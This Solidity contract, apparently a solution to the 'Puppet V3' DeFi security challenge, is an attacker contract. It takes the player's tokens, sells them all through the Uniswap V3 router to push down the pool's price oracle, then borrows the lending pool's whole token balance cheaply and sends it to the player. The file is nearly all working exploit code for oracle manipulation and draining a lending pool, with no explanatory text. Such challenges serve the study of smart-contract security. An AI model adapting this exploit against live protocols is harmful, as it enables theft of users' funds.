// SPDX-License-Identifier: MIT
pragma solidity >=0.7.6;
pragma abicoder v2;

import "../puppet-v3/PuppetV3Pool.sol";
import '@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol';

contract PuppetV3Attacker {
    
    uint24 public constant FEE = 3000;
    ISwapRouter public constant UNISWAP_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    address public player;
    PuppetV3Pool public lendingPool;
    IERC20Minimal public token;
    IERC20Minimal public weth;

    constructor(address _lendingPool) {
        player = msg.sender;
        lendingPool = PuppetV3Pool(_lendingPool);
        token = lendingPool.token();
        weth = lendingPool.weth();
    }

    function sellTokens() public {

        token.transferFrom(
            player, 
            address(this), 
            token.balanceOf(player)
        );

        token.approve(
            address(UNISWAP_ROUTER), 
            token.balanceOf(address(this))
        );

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(token),
            tokenOut: address(weth),
            fee: FEE,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: token.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        UNISWAP_ROUTER.exactInputSingle(params);
        
    }

    function borrowTokens() public payable {

        weth.approve(
            address(lendingPool), 
            weth.balanceOf(address(this))
        );

        lendingPool.borrow(token.balanceOf(
            address(lendingPool)
        ));

        token.transfer(
            player, 
            token.balanceOf(address(this))
        );

    }

}